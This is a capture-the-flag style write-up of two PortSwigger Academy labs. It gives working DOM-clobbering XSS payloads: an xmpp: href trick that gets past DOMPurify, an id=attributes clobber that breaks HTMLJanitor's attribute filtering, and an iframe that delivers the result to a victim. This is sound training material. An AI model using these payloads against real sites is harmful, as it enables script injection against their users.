## Labs Covered

This write-up focuses on the following **EXPERT-level labs** from the PortSwigger Web Security Academy related to **DOM-based vulnerabilities**:

**Exploiting DOM clobbering to enable XSS**  
This lab demonstrates how attackers can exploit DOM clobbering to manipulate the document structure and enable XSS attacks.

**Clobbering DOM attributes to bypass HTML filters**  
This lab shows how attackers can clobber DOM object attributes to bypass server-side or client-side HTML sanitization filters.

---

### LAB 6 - Exploiting DOM clobbering to enable XSS

### Lab Description

<img width="861" height="418" alt="image" src="https://github.com/user-attachments/assets/b53bb563-627f-456b-b5f6-d855d1570183" />

### Solution

The application's comment function allows HTML input. Test with tags<h1>

# DOM Clobbering-Based XSS Exploit Walkthrough

### Step 1: HTML Input Allowed in Comments

The application's comment feature allows HTML tags like `<h1>`.

**Test Input:**

```html
<h1>Test Heading</h1>
```

**Output Screenshot:**

<img width="869" height="520" alt="image" src="https://github.com/user-attachments/assets/5dcf54cc-a63c-4157-b269-eada710ccb89" />

The `<h1>` tag is successfully rendered, confirming that HTML is processed.

---

### Step 2: Inspect JavaScript Source

Reviewing the page’s source reveals a script named `loadCommentsWithDomClobbering.js` that handles comment rendering.

**Screenshot:**

<img width="805" height="120" alt="image" src="https://github.com/user-attachments/assets/a06f56be-9365-4996-bdf8-d0aac0912fee" />

Relevant JS snippet:

<img width="830" height="152" alt="image" src="https://github.com/user-attachments/assets/dedad1a8-fd8f-42c2-9461-925795a6fa52" />

The core logic:

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'};
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
```

---

### Step 3: DOM Clobbering

We can clobber `window.defaultAvatar` by inserting two `<a>` tags:

* One with `id=defaultAvatar`
* One with `name=avatar`

This causes `window.defaultAvatar.avatar` to reference the `href` attribute of the second `<a>` tag.

**Clobbering Payload:**

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href='\"onerror=alert(1)//'>
```

**Problem:** The `href` attribute is removed due to DOMPurify sanitization.

<img width="882" height="366" alt="image" src="https://github.com/user-attachments/assets/b1c58d55-4170-42ce-920a-91069391fa30" />

---

### Step 4: Bypass DOMPurify Filtering

The app uses DOMPurify as shown:

```js
commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
```

To bypass this, we exploit a trick in DOMPurify:

* Using protocols like `cid:`, `xmpp:` in `href` attributes bypasses encoding
* `&quot;` gets decoded at runtime to `"` and stays unescaped

**Working Payload:**

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href=xmpp:&quot;onerror=alert(1)//>
```

---

### Step 5: Exploitation Process

1. **Post Comment 1:** Inject the clobber payload
2. **Post Comment 2:** Load any other comment → avatar rendering triggers XSS

**Clobber Comment Example:**

<img width="878" height="141" alt="image" src="https://github.com/user-attachments/assets/1fb32b4e-bc61-46c4-92bf-29b1ba79018f" />

**Triggered XSS Result:**

<img width="881" height="158" alt="image" src="https://github.com/user-attachments/assets/e79d5c45-913c-45de-b504-fbd185d05f62" />

---


The XSS was successfully triggered via DOM Clobbering and sanitization bypass.

<img width="889" height="143" alt="image" src="https://github.com/user-attachments/assets/e412ab73-dbb8-40bb-89dd-d83581c7a191" />

---


### LAB 7 - Clobbering DOM attributes to bypass HTML filters

### Lab Description

<img width="888" height="465" alt="image" src="https://github.com/user-attachments/assets/225b3f72-2687-44c1-afe1-c112e254630f" />


### Solution


# DOM Clobbering Bypass via HTMLJanitor Configuration

## Step 1: Discovering the Sanitizer – `HTMLJanitor`

Reading the HTML source of the post page reveals that the application loads two key scripts:

* `loadCommentsWithDomClobbering.js`
* The `HTMLJanitor` library for sanitizing user input.

**Screenshot:**

<img width="951" height="184" alt="image" src="https://github.com/user-attachments/assets/d457eabd-158e-410b-ab13-c948f75faf3e" />

---

## Step 2: Whitelisted Tags and Attributes

In the script `loadCommentsWithDomClobbering.js`, we find a strict whitelist for allowed HTML tags and attributes:

```js
let janitor = new HTMLJanitor({
    tags: {
        input: {
            name: true,
            type: true,
            value: true
        },
        form: {
            id: true
        },
        i: {},
        b: {},
        p: {}
    }
});
```

Only the following are allowed:

| Tag           | Allowed Attributes      |
| ------------- | ----------------------- |
| `input`       | `name`, `type`, `value` |
| `form`        | `id`                    |
| `i`, `b`, `p` | None                    |

Then, when rendering comments:

```js
commentBodyPElement.innerHTML = janitor.clean(comment.body);
```

---

## Step 3: Testing the Whitelist

Testing with a valid comment:

```html
<form id=test><input name=button type=button value=Click>
```

It renders successfully because it complies with the whitelist.

**Screenshot:**

<img width="949" height="120" alt="image" src="https://github.com/user-attachments/assets/97d6e3df-b55c-497f-8c9c-9d73189edffb" />

---

## Step 4: Inspecting the `clean()` and `_sanitize()` Logic

The `clean()` method internally calls `_sanitize()` to remove disallowed attributes:

**Screenshot:**

<img width="879" height="243" alt="image" src="https://github.com/user-attachments/assets/5c640f02-f1d5-4f2a-b0d9-983155e371c9" />

Core logic from `_sanitize()`:

```js
// Sanitize attributes
for (var a = 0; a < node.attributes.length; a += 1) {
  var attr = node.attributes[a];
  if (shouldRejectAttr(attr, allowedAttrs, node)) {
    node.removeAttribute(attr.name);
    a = a - 1; // Adjust loop after removal
  }
}

// Sanitize children
this._sanitize(document, node);
```

---

## Step 5: Exploiting DOM Clobbering on `attributes`

If we clobber the `attributes` property on a node (i.e., set `id="attributes"` on a child input), `node.attributes.length` becomes `undefined`. This breaks the sanitizer loop and skips attribute validation.

### Payload:

```html
<form id=exp tabindex=1 onfocus=print()><input id=attributes>
```

**Explanation:**

* `form#exp` has `onfocus=print()`
* `input#attributes` clobbers the `form.attributes` property
* Sanitizer cannot loop over attributes → `onfocus` bypasses filtering

**Result Screenshot:**

<img width="930" height="431" alt="image" src="https://github.com/user-attachments/assets/0a697c9e-db19-4150-b355-1ec0914b975f" />

---

## Step 6: Triggering the Payload

Comment with the payload:

<img width="930" height="431" alt="image" src="https://github.com/user-attachments/assets/28e25091-4339-4087-8255-2b611299833e" />

Then, focus on the form via its `id`:

* `#exp` → triggers `onfocus=print()`
* The print dialog appears, confirming code execution.

**Execution Proof:**

<img width="934" height="572" alt="image" src="https://github.com/user-attachments/assets/461a7ec1-fe31-4f19-aa63-c362d64a19cd" />

---

## Step 7: Using an iframe to Auto-Focus (for Victim Delivery)

We send the victim a crafted `iframe` that triggers the focus event after a delay:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=7" 
        onload="setTimeout(()=>this.src=this.src+'#x',500)">
</iframe>
```

**Screenshot:**

<img width="922" height="110" alt="image" src="https://github.com/user-attachments/assets/e6938abb-cd8b-4c0b-9faf-e5c79ce374a6" />

---

## Final Result

Once the victim loads the malicious iframe, the payload is triggered and the challenge is solved.

**Final Screenshot:**

<img width="931" height="155" alt="image" src="https://github.com/user-attachments/assets/ed31d12e-3ac9-4d96-ac4b-2e3d25c6e28d" />





---




